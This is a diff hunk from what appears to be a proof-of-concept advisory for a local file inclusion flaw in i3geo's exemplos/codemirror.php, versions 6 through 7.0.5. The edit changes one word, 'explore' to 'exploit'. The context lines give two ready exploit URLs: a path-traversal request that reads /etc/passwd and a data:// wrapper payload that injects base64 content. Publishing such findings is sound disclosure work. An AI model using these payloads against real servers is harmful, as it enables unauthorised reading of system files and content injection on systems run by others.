@@ -6,7 +6,7 @@ i3geo - Proof of Concept - Version 6 <= 7.0.5
 
 The vulnerability is a LFI (Local File Inclusion) in codemirror.php file. The file is located in the "exemplos" folder (/i3geo/exemplos/).
 
-To explore the vulnerability:
+To exploit the vulnerability:
 - http://.../i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
 - http://.../i3geo/exemplos/codemirror.php?&pagina=data://text/plain;base64,SEFDS0VE
 
